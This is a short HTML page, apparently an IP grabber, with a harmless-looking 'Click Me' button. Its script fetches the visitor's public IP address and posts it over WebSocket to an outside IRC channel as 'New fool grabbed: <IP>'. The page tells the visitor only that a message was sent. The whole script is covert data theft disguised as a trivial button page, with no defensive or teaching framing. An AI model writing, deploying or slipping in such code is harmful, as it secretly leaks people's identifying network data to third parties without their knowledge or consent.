<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IRC WebSocket App</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        #output {
            margin-top: 20px;
            font-weight: bold;
            color: green;
        }
    </style>
</head>
<body>
    <button id="clickMe">Click Me</button>
    <div id="output"></div>

    <script>
        document.getElementById('clickMe').addEventListener('click', async () => {
            const ws = new WebSocket('wss://irc.h4ks.com:8097'); // Use secure WebSocket

            // Get user's IP address
            let userIP;
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                document.getElementById('output').textContent = 'Could not fetch IP address.';
                return;
            }

            ws.onopen = () => {
                const nick = 'YourNick'; // Adjust this to your desired nickname
                const realname = 'YourRealName'; // Adjust this to your desired real name
                ws.send(`NICK ${nick}`);
                ws.send(`USER ${nick} 0 * :${realname}`);
            };

            ws.onmessage = (event) => {
                const message = event.data;
                console.log('Message from server: ', message);

                // Check for authentication complete
                if (message.includes('001')) { // Typical RPL_WELCOME message from IRC server
                    ws.send('JOIN #lobby'); // Join the #lobby channel
                    const formattedMessage = `New fool grabbed: ${userIP}`;
                    ws.send(`PRIVMSG #lobby :${formattedMessage}`); // Send the message to #lobby
                    document.getElementById('output').textContent = 'Message sent to #lobby!';
                }
            };

            ws.onerror = (error) => {
                console.error('WebSocket error: ', error);
                document.getElementById('output').textContent = 'WebSocket connection error.';
            };

            ws.onclose = () => {
                console.log('WebSocket connection closed.');
            };
        });
    </script>
</body>
</html>
